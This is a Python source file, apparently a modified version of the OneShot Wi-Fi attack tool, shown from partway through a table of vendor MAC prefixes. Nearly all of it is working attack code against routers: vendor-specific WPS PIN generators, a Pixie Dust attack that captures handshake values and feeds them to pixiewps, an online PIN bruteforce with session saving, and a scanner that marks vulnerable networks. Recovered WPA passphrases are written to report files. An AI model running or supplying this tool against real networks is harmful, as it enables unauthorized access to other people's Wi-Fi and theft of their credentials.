            'pinEVSeries': ('58C41E', 'B0CCCE', 'D0AA5F'),
            
            # AIR3G WSC (AirLive variant)
            'pinAIR3G': ('004F62', '004F4B'),
            
            # Enhanced Wireless F6D (Belkin)
            'pinF6D': ('001150', '00173F', '001CDF', '002275', '00248C', '00265A', '0030F5', '0040D0', '004A77', '0060B0', '0080C8', '00A0C9', '00E04C'),
            
            # RT-G32 (ASUS)
            'pinRTG32': ('001A8C', '001BFC', '001E8C', '002215', '002354', '00248C', '00265A', '00304F', '0040D0', '004A77', '0060B0', '0080C8', '00A0C9', '00E04C'),
            
            # Smart Router R3 (TP-Link)
            'pinSmartRouter': ('000AEB', '000C42', '000E8F', '0010DC', '0014D1', '001A70', '001E58', '002191', '0022B0', '002401', '00248C', '002618', '002624', '00265A', '00304F', '0040D0', '004A77', '0060B0', '0080C8', '00A0C9', '00E04C'),
            
            # WR5570 (ZTE)
            'pinWR5570': ('001AC4', '001E5D', '002293', '00254C', '002719', '002A0A', '002D76', '002F9C', '00304F', '0040D0', '004A77', '0060B0', '0080C8', '00A0C9', '00E04C'),
            
            # RB Series (MikroTik)
            'pinRBSeries': ('000C42', '000E8F', '0010DC', '0014D1', '001A70', '001E58', '002191', '0022B0', '002401', '00248C', '002618', '002624', '00265A', '00304F', '0040D0', '004A77', '0060B0', '0080C8', '00A0C9', '00E04C'),
            
            # Modem/Router (Hilan Technology)
            'pinModemRouter': ('381C23',),
            
            # N/A Router (Generic/Unknown/Locked)
            'pinNARouter': ('000000', '111111', '222222', '333333', '444444', '555555', '666666', '777777', '888888', '999999', 'AAAAAA', 'BBBBBB', 'CCCCCC', 'DDDDDD', 'EEEEEE', 'FFFFFF'),
        }
        
        res = []
        for algo_id, masks in algorithms.items():
            # Check if MAC starts with any of the masks for this algorithm
            for mask in masks:
                if mac.startswith(mask):
                    res.append(algo_id)
                    break
        return res

    def pin24(self, mac):
        return mac.integer & 0xFFFFFF

    def pin28(self, mac):
        return mac.integer & 0xFFFFFFF

    def pin32(self, mac):
        return mac.integer % 0x100000000

    def pinDLink(self, mac):
        # Get the NIC part
        nic = mac.integer & 0xFFFFFF
        # Calculating pin
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        mac.integer += 1
        return self.pinDLink(mac)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)
        return pin


def recvuntil(pipe, what):
    s = ''
    while True:
        inp = pipe.stdout.read(1)
        if inp == '':
            return s
        s += inp
        if what in s:
            return s


def get_hex(line):
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()


class PixiewpsData:
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return (self.pke and self.pkr and self.e_nonce and self.authkey
                and self.e_hash1 and self.e_hash2)

    def get_pixie_cmd(self, full_range=False):
        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {}"\
                    " --e-hash2 {} --authkey {} --e-nonce {}".format(
                    self.pke, self.pkr, self.e_hash1,
                    self.e_hash2, self.authkey, self.e_nonce)
        if full_range:
            pixiecmd += ' --force'
        return pixiecmd


class ConnectionStatus:
    def __init__(self):
        self.status = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''

    def isFirstHalfValid(self):
        return self.last_m_message > 5

    def clear(self):
        self.__init__()


class BruteforceStatus:
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()   # Last PIN attempt start time
        self.attempts_times = collections.deque(maxlen=15)

        self.counter = 0
        self.statistics_period = 5

    def display_status(self):
        average_pin_time = statistics.mean(self.attempts_times)
        if len(self.mask) == 4:
            percentage = int(self.mask) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        print('[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
            percentage, self.start_time, average_pin_time))

    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self):
        self.__init__()


class Companion:
    """Main application part"""
    def __init__(self, interface, save_result=False, print_debug=False, bssid=''):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug

        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.__init_wpa_supplicant()

        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        user_home = str(pathlib.Path.home())
        self.sessions_dir = f'{user_home}/.OneShot/sessions/'
        self.pixiewps_dir = f'{user_home}/.OneShot/pixiewps/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        if not os.path.exists(self.sessions_dir):
            os.makedirs(self.sessions_dir)
        if not os.path.exists(self.pixiewps_dir):
            os.makedirs(self.pixiewps_dir)

        self.generator = WPSpin()

        self.bssid = bssid
        self.lastPwr = 0

    def __init_wpa_supplicant(self):
        print('[*] Running wpa_supplicant…')
        cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        # Waiting for wpa_supplicant control interface initialization
        while True:
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                raise ValueError('wpa_supplicant returned an error: ' + self.wpas.communicate()[0])
            if os.path.exists(self.wpas_ctrl_path):
                break
            time.sleep(.1)

    def sendOnly(self, command):
        """Sends command to wpa_supplicant"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        """Sends command to wpa_supplicant and returns the reply"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        (b, address) = self.retsock.recvfrom(4096)
        inmsg = b.decode('utf-8', errors='replace')
        return inmsg

    @staticmethod
    def _explain_wpas_not_ok_status(command: str, respond: str):
        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return ('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
                        'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
        return '[!] Something went wrong — check out debug log'

    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None, bssid=""):
        if not verbose:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                self.__print_with_indicators('*', 'Sending WPS Message M{}…'.format(n))
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                self.__print_with_indicators('*', 'Received WPS Message M{}'.format(n))
                if n == 5:
                    print('[+] The first half of the PIN is valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                self.__print_with_indicators('*', 'Received WSC NACK')
                print('[-] Error: wrong PIN code')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                assert(len(self.pixie_creds.e_nonce) == 16*2)
                if pixiemode:
                    print('[P] E-Nonce: {}'.format(self.pixie_creds.e_nonce))
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                assert(len(self.pixie_creds.pkr) == 192*2)
                if pixiemode:
                    print('[P] PKR: {}'.format(self.pixie_creds.pkr))
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                assert(len(self.pixie_creds.pke) == 192*2)
                if pixiemode:
                    print('[P] PKE: {}'.format(self.pixie_creds.pke))
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                assert(len(self.pixie_creds.authkey) == 32*2)
                if pixiemode:
                    print('[P] AuthKey: {}'.format(self.pixie_creds.authkey))
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                assert(len(self.pixie_creds.e_hash1) == 32*2)
                if pixiemode:
                    print('[P] E-Hash1: {}'.format(self.pixie_creds.e_hash1))
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                assert(len(self.pixie_creds.e_hash2) == 32*2)
                if pixiemode:
                    print('[P] E-Hash2: {}'.format(self.pixie_creds.e_hash2))
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                self.__print_with_indicators('*', 'Scanning…')
        elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
            self.connection_status.status = 'WPS_FAIL'
            print('[-] wpa_supplicant returned WPS-FAIL')
#        elif 'NL80211_CMD_DEL_STATION' in line:
#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            self.__print_with_indicators('*', 'Authenticating…')
        elif 'Authentication response' in line:
            self.__print_with_indicators('*', 'Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            self.__print_with_indicators('*', 'Associating with AP…')
        elif ('Associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                self.__print_with_indicators('+', 'Associated with {} (ESSID: {})'.format(bssid, self.connection_status.essid))
            else:
                self.__print_with_indicators('+', 'Associated with {}'.format(bssid))
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            self.__print_with_indicators('*', 'Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            self.__print_with_indicators('*', 'Received Identity Request')
        elif 'using real identity' in line:
            self.__print_with_indicators('*', 'Sending Identity Response…')
        elif self.bssid in line and 'level=' in line:
            self.lastPwr = line.split("level=")[1].split(" ")[0]
        elif pbc_mode and ('selected BSS ' in line):
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = bssid
            print('[*] Selected AP: {}'.format(bssid))
        elif bssid in line and 'level=' in line:
            signal = line.split("level=")[1].split(" ")[0]
            if 'noise=' in line:
                noise = line.split("noise=")[1].split(" ")[0]
                print ("[i] Current signal: {}, noise: {}".format(signal, noise))
            else:
                print ("[i] Current signal: {}".format(signal))

        return True

    def __runPixiewps(self, showcmd=False, full_range=False):
        self.__print_with_indicators('*', 'Running Pixiewps…')
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd:
            print(cmd)
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                           stderr=sys.stdout, encoding='utf-8', errors='replace')
        print(r.stdout)
        if r.returncode == 0:
            lines = r.stdout.splitlines()
            for line in lines:
                if ('[+]' in line) and ('WPS pin' in line):
                    pin = line.split(':')[-1].strip()
                    if pin == '<empty>':
                        pin = "''"
                    return pin
        return False

    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        print(f"[+] WPS PIN: '{wps_pin}'")
        print(f"[+] WPA PSK: '{wpa_psk}'")
        print(f"[+] AP SSID: '{essid}'")

    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        if not os.path.exists(self.reports_dir):
            os.makedirs(self.reports_dir)
        filename = self.reports_dir + 'stored'
        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(filename + '.txt', 'a', encoding='utf-8') as file:
            file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
                        dateStr, bssid, essid, wps_pin, wpa_psk
                    )
            )
        writeTableHeader = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
            csvWriter = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
            if writeTableHeader:
                csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
        print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')

    def __savePin(self, bssid, pin):
        filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
        with open(filename, 'w') as file:
            file.write(pin)
        print('[i] PIN saved in {}'.format(filename))

    def __prompt_wpspin(self, bssid):
        pins = self.generator.getSuggested(bssid)
        if len(pins) > 1:
            print(f'PINs generated for {bssid}:')
            print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
            for i, pin in enumerate(pins):
                number = '{})'.format(i + 1)
                line = '{:<3} {:<10} {:<}'.format(
                    number, pin['pin'], pin['name'])
                print(line)
            while 1:
                pinNo = input('Select the PIN: ')
                try:
                    if int(pinNo) in range(1, len(pins)+1):
                        pin = pins[int(pinNo) - 1]['pin']
                    else:
                        raise IndexError
                except Exception:
                    print('Invalid number')
                else:
                    break
        elif len(pins) == 1:
            pin = pins[0]
            print('[i] The only probable PIN is selected:', pin['name'])
            pin = pin['pin']
        else:
            return None
        return pin

    def __wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=None):
        if not verbose:
            verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        self.wpas.stdout.read(300)   # Clean the pipe
        if pbc_mode:
            if bssid:
                print(f"[*] Starting WPS push button connection to {bssid}…")
                cmd = f'WPS_PBC {bssid}'
            else:
                print("[*] Starting WPS push button connection…")
                cmd = 'WPS_PBC'
        else:
            print(f"[*] Trying PIN '{pin}'…")
            cmd = f'WPS_REG {bssid} {pin}'

        r = self.sendAndReceive(cmd)
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            print(self._explain_wpas_not_ok_status(cmd, r))
            return False

        while True:
            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose, bssid=bssid.lower())
            if not res:
                break
            if self.connection_status.status == 'WSC_NACK':
                break
            elif self.connection_status.status == 'GOT_PSK':
                break
            elif self.connection_status.status == 'WPS_FAIL':
                break

        self.sendOnly('WPS_CANCEL')
        return False

    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
                          pixieforce=False, store_pin_on_fail=False):
        if not pin:
            if pixiemode:
                try:
                    # Try using the previously calculated PIN
                    filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                    with open(filename, 'r') as file:
                        t_pin = file.readline().strip()
                        if input('[?] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
                            pin = t_pin
                        else:
                            raise FileNotFoundError
                except FileNotFoundError:
                    pin = self.generator.getLikely(bssid) or '12345670'
            elif not pbc_mode:
                # If not pixiemode, ask user to select a pin from the list
                pin = self.__prompt_wpspin(bssid) or '12345670'
        if pbc_mode:
            self.__wps_connection(bssid, pbc_mode=pbc_mode)
            bssid = self.connection_status.bssid
            pin = '<PBC mode>'
        elif store_pin_on_fail:
            try:
                self.__wps_connection(bssid, pin, pixiemode)
            except KeyboardInterrupt:
                print("\nAborting…")
                self.__savePin(bssid, pin)
                return False
        else:
            self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == 'GOT_PSK':
            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
            if self.save_result:
                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
            if not pbc_mode:
                # Try to remove temporary PIN file
                filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                try:
                    os.remove(filename)
                except FileNotFoundError:
                    pass
            return True
        elif pixiemode:
            if self.pixie_creds.got_all():
                pin = self.__runPixiewps(showpixiecmd, pixieforce)
                if pin:
                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
                return False
            else:
                print('[!] Not enough data to run Pixie Dust attack')
                return False
        else:
            if store_pin_on_fail:
                # Saving Pixiewps calculated PIN if can't connect
                self.__savePin(bssid, pin)
            return False

    def __first_half_bruteforce(self, bssid, f_half, delay=None):
        """
        @f_half — 4-character string
        """
        checksum = self.generator.checksum
        while int(f_half) < 10000:
            t = int(f_half + '000')
            pin = '{}000{}'.format(f_half, checksum(t))
            self.single_connection(bssid, pin)
            if self.connection_status.isFirstHalfValid():
                print('[+] First half found')
                return f_half
            elif self.connection_status.status == 'WPS_FAIL':
                print('[!] WPS transaction failed, re-trying last pin')
                return self.__first_half_bruteforce(bssid, f_half)
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerAttempt(f_half)
            if delay:
                time.sleep(delay)
        print('[-] First half not found')
        return False

    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
        """
        @f_half — 4-character string
        @s_half — 3-character string
        """
        checksum = self.generator.checksum
        while int(s_half) < 1000:
            t = int(f_half + s_half)
            pin = '{}{}{}'.format(f_half, s_half, checksum(t))
            self.single_connection(bssid, pin)
            if self.connection_status.last_m_message > 6:
                return pin
            elif self.connection_status.status == 'WPS_FAIL':
                print('[!] WPS transaction failed, re-trying last pin')
                return self.__second_half_bruteforce(bssid, f_half, s_half)
            s_half = str(int(s_half) + 1).zfill(3)
            self.bruteforce.registerAttempt(f_half + s_half)
            if delay:
                time.sleep(delay)
        return False

    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
        if (not start_pin) or (len(start_pin) < 4):
            # Trying to restore previous session
            try:
                filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
                with open(filename, 'r') as file:
                    if input('[?] Restore previous session for {}? [n/Y] '.format(bssid)).lower() != 'n':
                        mask = file.readline().strip()
                    else:
                        raise FileNotFoundError
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = start_pin[:7]

        try:
            self.bruteforce = BruteforceStatus()
            self.bruteforce.mask = mask
            if len(mask) == 4:
                f_half = self.__first_half_bruteforce(bssid, mask, delay)
                if f_half and (self.connection_status.status != 'GOT_PSK'):
                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
            elif len(mask) == 7:
                f_half = mask[:4]
                s_half = mask[4:]
                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
            raise KeyboardInterrupt
        except KeyboardInterrupt:
            print("\nAborting…")
            filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
            with open(filename, 'w') as file:
                file.write(self.bruteforce.mask)
            print('[i] Session saved in {}'.format(filename))
            if args.loop:
                raise KeyboardInterrupt

    def __print_with_indicators(self, level, msg):
        print('[{}] [{}] {}'.format(level, self.lastPwr, msg))

    def cleanup(self):
        self.retsock.close()
        self.wpas.terminate()
        os.remove(self.res_socket_file)
        shutil.rmtree(self.tempdir, ignore_errors=True)
        os.remove(self.tempconf)

    def __del__(self):
        #self.cleanup()
        try:
            self.cleanup()
        except (ImportError, AttributeError, TypeError):
            pass


class WiFiScanner:
    """docstring for WiFiScanner"""
    def __init__(self, interface, vuln_list=None):
        self.interface = interface
        self.vuln_list = vuln_list

        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
        try:
            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
                csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
                # Skip header
                next(csvReader)
                self.stored = []
                for row in csvReader:
                    self.stored.append(
                        (
                            row[1],   # BSSID
                            row[2]    # ESSID
                        )
                    )
        except FileNotFoundError:
            self.stored = []

    def iw_scanner(self) -> Dict[int, dict]:
        """Parsing iw scan results"""
        def handle_network(line, result, networks):
            networks.append(
                    {
                        'Security type': 'Unknown',
                        'WPS': False,
                        'WPS locked': False,
                        'Model': '',
                        'Model number': '',
                        'Device name': ''
                     }
                )
            networks[-1]['BSSID'] = result.group(1).upper()

        def handle_essid(line, result, networks):
            d = result.group(1)
            networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_level(line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))

        def handle_securityType(line, result, networks):
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                if 'Privacy' in result.group(2):
                    sec = 'WEP'
                else:
                    sec = 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN':
                    sec = 'WPA2'
                elif result.group(1) == 'WPA':
                    sec = 'WPA'
            elif sec == 'WPA':
                if result.group(1) == 'RSN':
                    sec = 'WPA/WPA2'
            elif sec == 'WPA2':
                if result.group(1) == 'WPA':
                    sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec

        def handle_wps(line, result, networks):
            networks[-1]['WPS'] = result.group(1)

        def handle_wpsLocked(line, result, networks):
            flag = int(result.group(1), 16)
            if flag:
                networks[-1]['WPS locked'] = True

        def handle_model(line, result, networks):
            d = result.group(1)
            networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_modelNumber(line, result, networks):
            d = result.group(1)
            networks[-1]['Model number'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_deviceName(line, result, networks):
            d = result.group(1)
            networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        cmd = 'iw dev {} scan'.format(self.interface)
        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        lines = proc.stdout.splitlines()
        networks = []
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
            re.compile(r'SSID: (.*)'): handle_essid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
            re.compile(r'(capability): (.+)'): handle_securityType,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
            re.compile(r' [*] Model: (.*)'): handle_model,
            re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
            re.compile(r' [*] Device name: (.*)'): handle_deviceName
        }

        for line in lines:
            if line.startswith('command failed:'):
                print('[!] Error:', line)
                return False
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res:
                    handler(line, res, networks)

        # Filtering non-WPS networks
        networks = list(filter(lambda x: bool(x['WPS']), networks))
        if not networks:
            return False

        # Sorting by signal level
        networks.sort(key=lambda x: x['Level'], reverse=True)

        # Putting a list of networks in a dictionary, where each key is a network number in list of networks
        network_list = {(i + 1): network for i, network in enumerate(networks)}

        # Printing scanning results as table
        def truncateStr(s, length, postfix="…"):
            """
            Truncate strings according to display width (supports Full and half width characters)
            :param s: input string
            :param length: Maximum display width (unit: column)
            :param postfix: Truncate suffixes (such as ellipses)
            """
            # Calculate the original display width
            original_width = wcwidth.wcswidth(s)
            
            # Scenario 1: The original width is exactly the same or smaller
            if original_width <= length:
                # Calculate the number of spaces to be filled (by display width)
                padding_needed = length - original_width
                # Allocate spaces evenly to the right of the string
                return s + ' ' * padding_needed
            
            # Scenario 2: Truncation is required
            postfix_width = wcwidth.wcswidth(postfix)
            max_allowed = length - postfix_width
            
            current_width = 0
            truncated = []
            for c in s:
                char_width = wcwidth.wcswidth(c)
                if current_width + char_width > max_allowed:
                    break
                truncated.append(c)
                current_width += char_width
            
            # Construct basic results
            result = "".join(truncated)
            if len(truncated) < len(s):
                result += postfix
            
            # Accurately adjust the display width
            result_width = wcwidth.wcswidth(result)
            if result_width > length:
                # Remove pre truncation restrictions and switch to more precise truncation
                # Emergency cutoff (to prevent exceeding the limit)
                # Change to character by character processing to ensure not exceeding the limit
                current_width = 0
                safe_truncated = []
                for c in result:
                    char_width = wcwidth.wcswidth(c)
                    if current_width + char_width > length:
                        break
                    safe_truncated.append(c)
                    current_width += char_width
                safe_result = "".join(safe_truncated)
                # If the truncated string becomes shorter, add ellipsis
                if len(safe_result) < len(result):
                    safe_result += postfix
                    # Recheck the width
                    if wcwidth.wcswidth(safe_result) > length:
                        # If the limit is still exceeded after adding ellipsis, remove the ellipsis
                        safe_result = safe_result[:-1]
                return safe_result
            
            # Fill in exact spaces
            padding_needed = length - result_width
            return result + ' ' * padding_needed

        def colored(text, color=None):
            """Returns colored text"""
            if color:
                if color == 'green':
                    text = '\033[92m{}\033[00m'.format(text)
                elif color == 'red':
                    text = '\033[91m{}\033[00m'.format(text)
                elif color == 'yellow':
                    text = '\033[93m{}\033[00m'.format(text)
                else:
                    return text
            else:
                return text
            return text

        if self.vuln_list:
            print('Network marks: {1} {0} {2} {0} {3}'.format(
                '|',
                colored('Possibly vulnerable', color='green'),
                colored('WPS locked', color='red'),
                colored('Already stored', color='yellow')
            ))
        print('Networks list:')
        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))

        network_list_items = list(network_list.items())
        if args.reverse_scan:
            network_list_items = network_list_items[::-1]
        for n, network in network_list_items:
            number = f'{n})'
            model = '{} {}'.format(network['Model'], network['Model number'])
            essid = truncateStr(network.get('ESSID', 'HIDDEN'), 25)
            deviceName = truncateStr(network['Device name'], 27)
    
            # Processing the display width of other fields
            processed_number = truncateStr(number, 4)
            processed_bssid = truncateStr(network['BSSID'], 18)
            processed_security = truncateStr(network['Security type'], 8)
            processed_level = truncateStr(str(network['Level']), 4)
            processed_device = deviceName  # 27 columns of width have been processed
            processed_model = model  # Assuming that the model fields do not need to be truncated or have been processed
            
            # Directly concatenate the processed fields, separated by spaces in the middle
            line_parts = [
                processed_number,
                processed_bssid,
                essid,
                processed_security,
                processed_level,
                processed_device,
                processed_model
            ]
            line = ' '.join(line_parts)
            
            if (network['BSSID'], network.get('ESSID', 'HIDDEN')) in self.stored:
                print(colored(line, color='yellow'))
            elif network['WPS locked']:
                print(colored(line, color='red'))
            elif self.vuln_list and (model in self.vuln_list):
                print(colored(line, color='green'))
            else:
                print(line)

        return network_list

    def prompt_network(self) -> str:
        networks = self.iw_scanner()
        if not networks:
            print('[-] No WPS networks found.')
            return
        while 1:
            try:
                networkNo = input('Select target (press Enter to refresh): ')
                if networkNo.lower() in ('r', '0', ''):
                    return self.prompt_network()
                elif int(networkNo) in networks.keys():
                    return networks[int(networkNo)]['BSSID']
                else:
                    raise IndexError
            except Exception:
                print('Invalid number')


def ifaceUp(iface, down=False):
    if down:
        action = 'down'
    else:
        action = 'up'
    cmd = 'ip link set {} {}'.format(iface, action)
    res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
    if res.returncode == 0:
        return True
    else:
        return False


def die(msg):
    sys.stderr.write(msg + '\n')
    sys.exit(1)


def usage():
    return """
OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg

%(prog)s <arguments>

Required arguments:
    -i, --interface=<wlan0>  : Name of the interface to use

Optional arguments:
    -b, --bssid=<mac>        : BSSID of the target AP
    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
    -K, --pixie-dust         : Run Pixie Dust attack
    -B, --bruteforce         : Run online bruteforce attack
    --push-button-connect    : Run WPS push button connection

Advanced arguments:
    -d, --delay=<n>          : Set the delay between pin attempts [0]
    -w, --write              : Write AP credentials to the file on success
    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
    -X, --show-pixie-cmd     : Always print Pixiewps command
    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
    --iface-down             : Down network interface when the work is finished
    -l, --loop               : Run in a loop
    -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
